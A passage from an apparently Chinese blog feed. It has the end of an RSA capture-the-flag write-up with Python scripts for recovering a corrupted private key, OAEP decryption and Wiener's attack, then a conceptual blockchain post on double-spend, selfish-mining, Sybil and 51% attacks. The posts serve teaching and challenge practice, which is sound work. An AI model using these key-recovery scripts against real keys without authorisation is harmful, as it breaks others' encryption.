invmod(a, mod)) &amp; (mod - <span class="number">1</span>)  <span class="comment"># hack for mod = power of 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_n</span><span class="params">(s)</span>:</span></span><br><span class="line">    s = re.sub(<span class="string">r"[^0-9a-f]"</span>, <span class="string">""</span>, s)</span><br><span class="line">    <span class="keyword">return</span> int(s, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk</span><span class="params">(s)</span>:</span></span><br><span class="line">    cleaned = <span class="string">""</span>.join(map(<span class="keyword">lambda</span> x: x[<span class="number">-2</span>:], s.split(<span class="string">":"</span>)))</span><br><span class="line">    <span class="keyword">return</span> msk_ranges(cleaned), msk_mask(cleaned), msk_val(cleaned)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk_ranges</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [range(<span class="number">16</span>) <span class="keyword">if</span> c == <span class="string">" "</span> <span class="keyword">else</span> [int(c, <span class="number">16</span>)] <span class="keyword">for</span> c <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk_mask</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">""</span>.join(<span class="string">"0"</span> <span class="keyword">if</span> c == <span class="string">" "</span> <span class="keyword">else</span> <span class="string">"f"</span> <span class="keyword">for</span> c <span class="keyword">in</span> s), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk_val</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">""</span>.join(<span class="string">"0"</span> <span class="keyword">if</span> c == <span class="string">" "</span> <span class="keyword">else</span> c <span class="keyword">for</span> c <span class="keyword">in</span> s), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据文件pubilc.pem得到</span></span><br><span class="line">E = ...</span><br><span class="line"><span class="comment">#文件pubilc.pem中第一个Modulus</span></span><br><span class="line">N = to_n(<span class="string">"""..."""</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#private.corrupted中的prime1</span></span><br><span class="line">p_ranges, pmask_msk, pmask_val = msk(<span class="string">""" ... """</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#prime2</span></span><br><span class="line">q_ranges, qmask_msk, qmask_val = msk(<span class="string">""" ... """</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#privateExponent</span></span><br><span class="line">_, dmask_msk, dmask_val = msk(<span class="string">""" ... """</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#exponent1</span></span><br><span class="line">_, dpmask_msk, dpmask_val = msk(<span class="string">""" ... """</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#exponent2</span></span><br><span class="line">_, dqmask_msk, dqmask_val = msk(<span class="string">""" ... """</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(K, Kp, Kq, check_level, break_step)</span>:</span></span><br><span class="line">    max_step = <span class="number">0</span></span><br><span class="line">    cands = [<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> range(<span class="number">1</span>, break_step + <span class="number">1</span>):</span><br><span class="line">        <span class="comment">#print " ", step, "( max =", max_step, ")"</span></span><br><span class="line">        max_step = max(step, max_step)</span><br><span class="line"></span><br><span class="line">        mod = <span class="number">1</span> &lt;&lt; (<span class="number">4</span> * step)</span><br><span class="line">        mask = mod - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        cands_next = []</span><br><span class="line">        <span class="keyword">for</span> p, new_digit <span class="keyword">in</span> product(cands, p_ranges[-step]):</span><br><span class="line">            pval = (new_digit &lt;&lt; ((step - <span class="number">1</span>) * <span class="number">4</span>)) | p</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">1</span>:</span><br><span class="line">                qval = solve_linear(pval, N &amp; mask, mod)</span><br><span class="line">                <span class="keyword">if</span> qval <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(qval, mask, qmask_msk, qmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">2</span>:</span><br><span class="line">                val = solve_linear(E, <span class="number">1</span> + K * (N - pval - qval + <span class="number">1</span>), mod)</span><br><span class="line">                <span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(val, mask, dmask_msk, dmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">3</span>:</span><br><span class="line">                val = solve_linear(E, <span class="number">1</span> + Kp * (pval - <span class="number">1</span>), mod)</span><br><span class="line">                <span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(val, mask, dpmask_msk, dpmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> check_level &gt;= <span class="number">4</span>:</span><br><span class="line">                val = solve_linear(E, <span class="number">1</span> + Kq * (qval - <span class="number">1</span>), mod)</span><br><span class="line">                <span class="keyword">if</span> val <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> check_val(val, mask, dqmask_msk, dqmask_val):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> pval * qval == N:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"Kq ="</span>, Kq</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"pwned"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"p ="</span>, pval</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"q ="</span>, qval</span><br><span class="line">                    p = pval</span><br><span class="line">                    q = qval</span><br><span class="line">                    d = invmod(E, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">                    coef = invmod(p, q)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">                    <span class="keyword">print</span> RSA.construct(map(long, (N, E, d, p, q, coef))).exportKey()</span><br><span class="line">                    quit()</span><br><span class="line"></span><br><span class="line">            cands_next.append(pval)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> cands_next:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        cands = cands_next</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_val</span><span class="params">(val, mask, mask_msk, mask_val)</span>:</span></span><br><span class="line">    test_mask = mask_msk &amp; mask</span><br><span class="line">    test_val = mask_val &amp; mask</span><br><span class="line">    <span class="keyword">return</span> val &amp; test_mask == test_val</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> K <span class="keyword">in</span> range(<span class="number">1</span>, E):</span><br><span class="line">    <span class="keyword">if</span> K % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"checking"</span>, K</span><br><span class="line">    <span class="keyword">if</span> search(K, <span class="number">0</span>, <span class="number">0</span>, check_level=<span class="number">2</span>, break_step=<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"K ="</span>, K</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Kp <span class="keyword">in</span> range(<span class="number">1</span>, E):</span><br><span class="line">    <span class="keyword">if</span> Kp % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"checking"</span>, Kp</span><br><span class="line">    <span class="keyword">if</span> search(K, Kp, <span class="number">0</span>, check_level=<span class="number">3</span>, break_step=<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Kp ="</span>, Kp</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Kq <span class="keyword">in</span> range(<span class="number">1</span>, E):</span><br><span class="line">    <span class="keyword">if</span> Kq % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"checking"</span>, Kq</span><br><span class="line">    <span class="keyword">if</span> search(K, Kp, Kq, check_level=<span class="number">4</span>, break_step=<span class="number">9999</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Kq ="</span>, Kq</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><strong>解题脚本(最优非对称加密填充)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'pubkey.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> N</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'private.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    private = RSA.importKey(f)</span><br><span class="line">    oaep = PKCS1_OAEP.new(private)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">print</span> oaep.decrypt(f.read())</span><br></pre></td></tr></table></figure><h2 id="03-参考"><a href="#03-参考" class="headerlink" title="03 参考"></a>03 参考</h2><p><a href="https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html" target="_blank" rel="noopener">RSA 私钥恢复和最优非对称加密填充</a></p><hr><h1 id="0x08-wiener-attack-e特别大"><a href="#0x08-wiener-attack-e特别大" class="headerlink" title="0x08 wiener attack(e特别大)"></a>0x08 wiener attack(e特别大)</h1><h2 id="01-思路-7"><a href="#01-思路-7" class="headerlink" title="01 思路"></a>01 思路</h2><ol><li>给出的n分解无望，而且e特别大，利用<code>wiener attack</code>脚本分解；</li><li>然后利用一般方法求解即可。</li></ol><h2 id="02-代码-7"><a href="#02-代码-7" class="headerlink" title="02 代码"></a>02 代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">continued_fractions_expansion</span><span class="params">(numerator,denominator)</span>:</span><span class="comment">#(e,N)</span></span><br><span class="line">    result=[]</span><br><span class="line"> </span><br><span class="line">    divident=numerator%denominator</span><br><span class="line">    quotient=numerator/denominator</span><br><span class="line">    result.append(quotient)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> divident!=<span class="number">0</span>:</span><br><span class="line">        numerator=numerator-quotient*denominator</span><br><span class="line"> </span><br><span class="line">        tmp=denominator</span><br><span class="line">        denominator=numerator</span><br><span class="line">        numerator=tmp</span><br><span class="line"> </span><br><span class="line">        divident=numerator%denominator</span><br><span class="line">        quotient=numerator/denominator</span><br><span class="line">        result.append(quotient)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents</span><span class="params">(expansion)</span>:</span></span><br><span class="line">    convergents=[(expansion[<span class="number">0</span>],<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(expansion)):</span><br><span class="line">        numerator=<span class="number">1</span></span><br><span class="line">        denominator=expansion[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">            numerator+=expansion[j]*denominator</span><br><span class="line">            <span class="keyword">if</span> j==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            tmp=denominator</span><br><span class="line">            denominator=numerator</span><br><span class="line">            numerator=tmp</span><br><span class="line">        convergents.append((numerator,denominator))<span class="comment">#(k,d)</span></span><br><span class="line">    <span class="keyword">return</span> convergents</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newtonSqrt</span><span class="params">(n)</span>:</span></span><br><span class="line">    approx = n/<span class="number">2</span></span><br><span class="line">    better = (approx + n/approx)/<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> better != approx:</span><br><span class="line">        approx = better</span><br><span class="line">        better = (approx + n/approx)/<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> approx</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_attack</span><span class="params">(cons,e,N)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> cs <span class="keyword">in</span> cons:</span><br><span class="line">        k,d=cs</span><br><span class="line">        <span class="keyword">if</span> k==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi_N=(e*d<span class="number">-1</span>)/k</span><br><span class="line">        <span class="comment">#x**2-((N-phi_N)+1)*x+N=0</span></span><br><span class="line">        a=<span class="number">1</span></span><br><span class="line">        b=-((N-phi_N)+<span class="number">1</span>)</span><br><span class="line">        c=N</span><br><span class="line">        delta = b*b - <span class="number">4</span>*a*c</span><br><span class="line">        <span class="keyword">if</span> delta&lt;=<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        x1= (newtonSqrt(delta)-b)/(<span class="number">2</span>*a)</span><br><span class="line">        x2=-(newtonSqrt(delta)+b)/(<span class="number">2</span>*a)</span><br><span class="line">        <span class="keyword">if</span> x1*x2==N:</span><br><span class="line">            <span class="keyword">return</span> [x1,x2,k,d]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">N = ...</span><br><span class="line">e = ...</span><br><span class="line"> </span><br><span class="line">expansion = continued_fractions_expansion(e,N)</span><br><span class="line">cons = convergents(expansion)</span><br><span class="line"> </span><br><span class="line">p, q, k, d = wiener_attack(cons, e, N)</span><br><span class="line"><span class="keyword">print</span> p</span><br><span class="line"><span class="keyword">print</span> q</span><br><span class="line"></span><br><span class="line">c = ... <span class="comment">#密文</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = pow(c, d, N)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure><hr><h1 id="0x0-reference"><a href="#0x0-reference" class="headerlink" title="0x0 reference"></a>0x0 reference</h1><ul><li><a href="https://blog.csdn.net/qq_28573835/article/details/86164877" target="_blank" rel="noopener">Ubuntu 安装gmpy2模块</a></li><li><a href="https://bestwing.me/Common-types-of-RSA.html" target="_blank" rel="noopener">一大波RSA就要来了~~</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链的那些事</title>
      <link href="/2020/06/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
      <url>/2020/06/27/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>　　有人说区块链是一场伟大的实验，有人说区块链是一场革命，有人说区块链是一个世纪骗局，还有人说区块链是百年难得一遇的良机，人人参与是社会发展的必然趋势<strong>[1]</strong>。而且，区块链的发明者中本聪是何许人也？仍然未知，无疑为其蒙上了一层神秘面纱。<br>　　这里需要指出的是不要将区块链与比特币混淆，区块链是以比特币为代表的加密货币的底层支撑技术；比特币是区块链的一个应用。巴菲特表示：“这是一个赌博的东西……有很多欺诈与之有关。比特币没有产生任何价值<strong>[2]</strong>。” 换言之，与其说比特币用来投资，倒不如说是用来投机。否定比特币并不意味着否定区块链，恰恰相反，我们应该好好领悟区块链的技术原理。国家支持区块链的技术的发展：在2019年10月24日中央政治局第十八次集体学习中，习总书记指出：区块链技术应用已延伸到数字金融、物联网、智能制造、供应链管理、数字资产交易等多个领域，要加快推动区块链技术和产业创新发展，积极推进区块链和经济社会融合发展<strong>[3]</strong>。 2020年4月20日国家发改委也正式将区块链技术纳入新基建范畴<strong>[3]</strong>。</p><p>　　表明立场，谈技术。技术主要是来自于《比特币白皮书》，<a href="https://dragonliu.ml/lun-wen-ji-lei/qu-kuai-lian/bitcoin-a-peer-to-peer-electronic-cash-system" target="_blank" rel="noopener">我跳</a>。</p><h1 id="01-介绍"><a href="#01-介绍" class="headerlink" title="01 介绍"></a>01 介绍</h1><p>　　区块链技术依靠共识机制和分布式账本，不需要第三方信用机构就可以避免双重支付问题；同时，通过“工作量证明”（POW，proof of work）及“权益证明”（proof of stake），区块链使得所有参与者可以在某些方面达成一致，无需信任单个节点，从而解决拜占庭将军问题。</p><p>　　比特币网络的全节点时时刻刻都在进行数学运算（挖矿、工作量证明），每个节点贡献自己的算力来竞争解决一个动态可调整的数学问题（进行 SHA256 运算的结果小于某个值），成功解决该数学问题的节点将获得一定数量的比特币以及该区块的记账权，并且该节点将当前时间段的所有交易打包计入一个新的区块，获得基于自愿原则的交易手续费，所有的交易都会经过算法处理（SHA256），并且经过验证，产生一定格式的区块并将该区块链接到主链上。整个比特币网络周而复始，比特币网络顺利运行。</p><p>中本聪在其比特币白皮书中非常详细地介绍了区块链系统的建立过程：</p><p>第１步 新的交易向全网所有节点广播；</p><p>第２步 每个节点把收到的交易都写入到一个区块中；</p><p>第３步 每个节点都在新的区块上进行计算，寻找一个工作量证明解；</p><p>第４步 某个节点找到工作量证明解时，就把其所在区块向全网进行广播；</p><p>第５步 其他节点收到广播的这个区块后对其进行验证，只有所有交易都被 验证是有效的且未被使用的之后，该区块才能被认可；</p><p>第６步 每个节点通过将此区块的哈希值作为父哈希值来进行下一个区块的 计算，表示节点认可了此区块有效。</p><p>由于每个区块都带有前一区块的特征，想要篡改一个区块的交易记录，必须要重新计算该块之后的所有区块，需要修改时间越久的区块，所花费的算力越大。一般来说，一个区块后面有 6 个区块，这个区块就无法被修改了，也就是认为这个区块可信。[6]</p><h1 id="02-自问自答"><a href="#02-自问自答" class="headerlink" title="02 自问自答"></a>02 自问自答</h1><ul><li><p><strong>问</strong>：比特币就是区块链吗？</p></li><li><p><strong>答</strong>：虽然前面有提及，但仍需再重复一遍。以比特币为代表的加密货币的底层支撑技术被称为区块链技术，比特币是区块链的一个应用。</p></li><li><p><strong>问</strong>：为什么要设计工作量证明呢？</p></li><li><p><strong>答</strong>：这个问题从两个方面回答：</p><ul><li>为了控制比特币生成的速度。中本聪的设计是比特币最多被细分到小数点后8位，之后将再也无法被细分。且第一个区块会有50个比特币奖励，每过21万个区块，比特币的产量减半。中本聪通过调节工作量证明的难度，使每一个新区块生成大概需要10分钟。所以比特币每四年产出速度减半一次，直到2140年，每一个区块的比特币将不能再被细分，这时比特币就开采完毕了，等比数列求和可得总量约为2100万个。</li><li>如果不设计工作量证明，将无法抵御黑客的攻击。例如，你在饿了么上支付了18元你的外卖费用。你作为黑客，如果想要修改这一笔交易，就必须重新玩一次这个区块上的新的跳一跳到1000分，且这笔交易所在的区块，之后的所有区块，你都必须完成游戏并修改直到你的链子是全网络最长的一条时，你才修改成功了。当然，中本聪实际设计的“游戏”要比跳一跳难的多，他会消耗全网巨大的CPU算力，只要黑客手上的算力无法达到全网算力的51%,要改变任意一笔交易将会变得很难，且难度系数会随着时间成指数增长。</li></ul><hr></li></ul><h1 id="03-常见攻击"><a href="#03-常见攻击" class="headerlink" title="03 常见攻击"></a>03 常见攻击</h1><h2 id="0x01-doublespend"><a href="#0x01-doublespend" class="headerlink" title="0x01  doublespend"></a>0x01  doublespend</h2><p>　　翻译为双重支付，或直译为“双花”。所表达的意思也很简单，一笔数字资产既支付给了A，又支付给了B。结合<strong>51％的攻击力</strong>一起食用。</p><h2 id="0x02-Selfish-mining"><a href="#0x02-Selfish-mining" class="headerlink" title="0x02 Selfish mining"></a>0x02 Selfish mining</h2><p>​        目前还没有找到中文解释，先直译为“私自挖矿攻击”。正常挖矿过程中，矿工挖到矿了都会立刻广播结果，生怕别人跟我来抢这个区块。但是在Selfish mining中则不然。假设目前所有矿工都工作在区块0上。这时攻击者首先发信新的区块（区块1），他会保留刚挖到的区块，把该区块当做自己的私有链，在私有连上进行挖下一个区块。假如攻击者又挖到了第二个区块（区块2），而这时其他矿工挖到了新区块（区块1’，因为没有听到区块1，还工作在区块0上），攻击者会直接提交两个区块。因为这时候0-1-2这条链长于0-1’这条链，0-1-2会被选做主链。因此，攻击者能获得2个区块的奖励，而别人的算力浪费了，无法获得奖励。[3]</p><h2 id="0x03-DoS-amp-DDoS"><a href="#0x03-DoS-amp-DDoS" class="headerlink" title="0x03 DoS &amp; DDoS"></a>0x03 DoS &amp; DDoS</h2><p>　　计算中的分布式拒绝服务（DDOS）攻击是一种攻击，其中犯罪者试图通过向网络充斥大量多余请求以试图使系统过载，使其用户无法使用网络资源。这是一种攻击不仅是区块链，而且任何在线服务都会受到影响。 [5]</p><h2 id="0x04-Sybil-女巫攻击"><a href="#0x04-Sybil-女巫攻击" class="headerlink" title="0x04 Sybil 女巫攻击"></a>0x04 Sybil 女巫攻击</h2><p>　　Sybil 攻击是通过创建多个虚假身份来尝试操纵 P2P 网络。 对于观察者来说，这些不同的身份看起来像个人用户，但在幕后，单个实体一次控制所有这些假实体。特别是当您考虑在线投票时，这种类型的攻击非常重要。 我们看到 Sybil 攻击的另一个领域是社交网络，过多假账户可以引导公众的讨论。</p><p>　　Sybil 攻击的另一个可能用途是审查某些参与者。 许多 Sybil 节点可以围绕您的节点，并阻止它连接到网络上的其他诚实节点。这样可以防止您向网络发送或接收信息。</p><p>　　缓解 Sybil 攻击的一种方法是引入或提高创建身份的成本。这个成本必须仔细平衡。它必须足够低，以便不限制新参与者加入网络并创建合法身份。它同时也必须足够高，以至于在短时间内创建大量身份变得非常困难。在 PoW 区块链中，实际对交易打包的节点是挖矿节点。有一个现实世界的成本，即购买矿机的成本，与创建虚假的“采矿标识”相关联。另外，拥有大量挖掘节点仍然不足以对网络产生巨大影响。要产生大影响，你还需要大量的算力。换句话说，您需要大型计算机集群。相关的成本使 Sybil 难以对工作证明区块链发起攻击。[5]</p><h2 id="0x05-51％的攻击力"><a href="#0x05-51％的攻击力" class="headerlink" title="0x05 51％的攻击力"></a>0x05 51％的攻击力</h2><p>　　对公共 PoW 区块链的最著名的攻击类型是 51％的攻击。51％攻击的目标是执行双重花费，这意味着将硬币同时花出去两次。要对区块链网络执行 51％的攻击，您需要控制网络的大部分哈希率或计算能力，正如名字一样，需要控制 51% 的算力才能发起攻击。</p><p>　　想要执行双花攻击的恶意矿工，他首先创建一个常规交易，再将其硬币存到交易所，再换成好币或其它货币。这发生在下面的<strong>40</strong> 区块中。与此同时，他们将开始私下挖出一条私链。这意味着他们将遵循通常的挖掘协议，但有两个例外。</p><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/ggggg.jpg" class="lozad"></p><p>　　首先，他们不会将自己的交易打包在自己的私人开采的链中。其次，他们不会将他们找到的块广播到网络，因此我们将其称为私有链。</p><p>　　如果他们控制大部分算力，他们的链条平均出块速度将比诚实链条快。PoW 区块链中的最长链规则，也称为中本聪共识，用于在这种情况下发生的情况。具有更多区块的分支链，被认为是有效链。</p><p>　　一旦攻击者收到用他们的硬币购买的货币或其他货币，他们就会将私链广播到整个网络。所有诚实的矿工将放弃诚实的链条，并开始挖掘恶意链。攻击者的交易视为从未发生过，因为攻击者未将其包含在恶意链中。攻击者仍在控制他们的资金，现在可以再次使用它们。</p><hr><h1 id="04-名词解释"><a href="#04-名词解释" class="headerlink" title="04 名词解释"></a>04 名词解释</h1><h2 id="0x01-Inter-block-time"><a href="#0x01-Inter-block-time" class="headerlink" title="0x01 Inter-block time"></a>0x01 Inter-block time</h2><p>　　This is the time elapsed between the generation of each block. For bitcoin the blocks are generated every 10 minutes, for litecoin it’s 2.5 minutes. Any value can be used but an appropriate value is usually between a few minutes; if the generation time is too fast it might destabilize the blockchain, if it’s too slow it may not attract many users[4].</p><h2 id="0x02-proof-of-work-PoW"><a href="#0x02-proof-of-work-PoW" class="headerlink" title="0x02 proof of work(PoW)"></a>0x02 proof of work(PoW)</h2><p>　　工作证明（Proof Of Work，POW），也称为工作量的证明。这里的工作是指找到一个合理的区块哈希值，它需要不断地进行大量的计算，计算时间取决于当前目标的难度和机器的运算速度。当一个节点找到这个值之后，就说明该节点确实经过了大量的计算，这就是工作量证明。由于验证只需对结果值进行一次哈希运算，因此ＰＯＷ的验证效率很高。</p><h2 id="0x03-Hash"><a href="#0x03-Hash" class="headerlink" title="0x03 Hash"></a>0x03 Hash</h2><p>　　哈希（也称为散列）算法将任意长度的输入值映射为较短的固定长度的二进制值。例如，SHA256算法就是将任意长度的输入映射为长度为256位的固定长度输出，这个二进制值称为哈希值（也称为散列值）。数据的哈希值可以检验数据的完整性，一般用于快速查找和加密算法。哈希算法广泛应用于区块链中，区块链通常不保存原始数据，而是保存该数据的哈希值。</p><h2 id="0x04-Merkle-树"><a href="#0x04-Merkle-树" class="headerlink" title="0x04 Merkle 树"></a>0x04 Merkle 树</h2><p>　　Merkle树是由Ralph Merkle发明的一种基于数据哈希构建的树。区块链系统采用二叉树型的 Merkle树对该区块的所有交易进行归纳表示，同时生成该交易集合的数字签名。</p><h2 id="0x05-时间戳服务"><a href="#0x05-时间戳服务" class="headerlink" title="0x05 时间戳服务"></a>0x05 时间戳服务</h2><p>　　区块链系统通过给每一笔交易盖上正确的时间戳，以此证明在这个时刻这笔交易确实发生，交易中资金的所属权已经转移，之前资金所有者再次使用这笔资金时就会报错，从而解决重复支付问题。另外，每一个区块也会盖上正确的时间戳，从而形成一个按时间顺序发展的正确链表。</p><h2 id="0x06-拜占庭将军问题-Byzantine-failures"><a href="#0x06-拜占庭将军问题-Byzantine-failures" class="headerlink" title="0x06 拜占庭将军问题(Byzantine failures)"></a>0x06 拜占庭将军问题(Byzantine failures)</h2><p>　　